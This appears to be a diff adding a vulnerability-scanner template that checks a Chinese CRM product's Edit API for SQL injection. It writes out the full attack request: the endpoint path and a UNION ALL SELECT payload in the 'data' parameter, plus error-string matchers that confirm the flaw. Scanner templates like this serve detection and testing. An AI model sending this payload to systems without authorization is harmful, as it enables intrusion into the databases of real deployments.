@@ -1,0 +1,32 @@
+id: poc-yaml-wecrm-pjb-edit-sqli
+info:
+  name: 任我行协同CRM普及版 Edit SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the 任我行协同CRM普及版 Edit API. The injection point is within the `data` parameter, and it confirms the presence of vulnerability based on specific error messages in the response body.
+http:
+  - method: POST
+    path:
+      - "/crm/api/OpenApi/CommonDict/Edit?accesstoken=1&accesskey=1&timestamp=1&nonce=1&signature=1"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      enumType=69&data={"ID":"1","Name":"'+UNION+ALL+SELECT+@@VERSION--"}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "Microsoft SQL Server"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+      - type: status
+        status:
+          - 200
